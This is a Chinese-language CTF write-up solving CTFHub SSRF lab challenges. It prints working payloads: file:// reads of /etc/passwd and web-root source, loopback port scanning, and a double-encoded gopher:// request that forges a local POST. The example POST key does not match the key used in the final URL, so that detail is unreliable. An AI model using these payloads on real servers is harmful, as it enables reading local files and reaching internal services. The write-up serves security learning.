---

title: CTFHub-SSRF  WP
date: 2026-07-21
categories: ["CTF-Writeups"]
permalink: /ctf-writeups/ctfhub-ssrf-wp
---


# 1.内网访问
题目的描述就是：尝试访问位于127.0.0.1的flag.php吧！
访问链接后是个空白的界面，页面源码也是没有的，不过细心的你发现url是这样的`/?url=_`这是一个很明显的SSRF漏洞，根据提示我们只需要`/?url=127.0.0.1/flag.php`就能拿到flag
# 2.伪协议读取文件伪协议读取文件
题目的描述就是：尝试去读取一下Web目录下的flag.php吧！
和第一题类似，我们按照要求读取一下Web目录下的flag.php`/?url=file:///var/www/html/flag.php`奇怪，页面回显`？？？`
其实flag藏在了页面源码里
# 3.端口扫描
题目的描述就是：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦
所以我们对`/?url=127.0.0.1:xxxx`的端口进行扫描，每个环境的端口不同，所以需要用bp来扫描一下
# 4.POST请求
题目的描述就是：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年
先用file:///etc/passwd试试能否读取**本地文件系统**中的文件，发现是可以的
于是我可以使用file://协议来读取index.php的源码，即
```
/?url=file:///var/www/html/index.php
```
发现源码是
```php
<?php 
error_reporting(0); 
if (!isset($_REQUEST['url'])){ header("Location: /?url=_"); exit;
 }$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch); 
curl_close($ch);
```
显而易见是一个ssrf漏洞，我们接着可以查看/flag.php
```
/?url=file:///var/www/html/flag.php
```
发现/flag.php的源码是
```php
<?php 
error_reporting(0); 
if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") { 
echo "Just View From 127.0.0.1"; return; } 
$flag=getenv("CTFHUB"); 
$key = md5($flag); 
if (isset($_POST["key"]) && $_POST["key"] == $key) { echo $flag; exit; 
} ?> 
<form action="[/flag.php](view-source:http://challenge-d05492ab5c562855.sandbox.ctfhub.com:10800/flag.php)" method="post"> 
<input type="text" name="key"> 
<!-- Debug: key=<?php echo $key;?>--> 
</form>
```
发现了获取flag的条件：该页面仅允许从127.0.0.1访问，并且需要通过POST方式提交key参数，其值必须等于flag的MD5哈希值。源码中还包含一个Debug注释，直接泄露了key的值
```http
<form action="[/flag.php](view-source:http://challenge-d05492ab5c562855.sandbox.ctfhub.com:10800/flag.php)" method="post"> <input type="text" name="key"> <!-- Debug: key=ad066169528a2328f7f18a35f4692e26--> </form>
```
根据flag.php的源码分析，获取flag需要两个条件：第一，请求必须来自127.0.0.1（即本地
访问）；第二，需要通过POST方式提交key参数，且key的值必须等于flag的MD5哈希。幸运的是，源码中的Debug注释直接暴露了key的值。我们通过SSRF从127.0.0.1访问flag.php，即可在
返回的HTML中看到Debug注释里的key值。
由于flag.php要求POST请求，而普通的SSRF通过url参数只能发起GET请求，因此需要借助
Gopher协议来构造自定义的POST请求。Gopher协议是SSRF利用中非常重要的协议，它允许攻
击者构造任意格式的TCP数据包，从而实现对内网服务的精确交互。
构造的原始POST请求如下：
```http
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=6c054e64ac8df2b8ca9d1114644bf4ca
```
二次编码后的url:
```
/?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dad066169528a2328f7f18a35f4692e26
```
即可拿到flag
# 



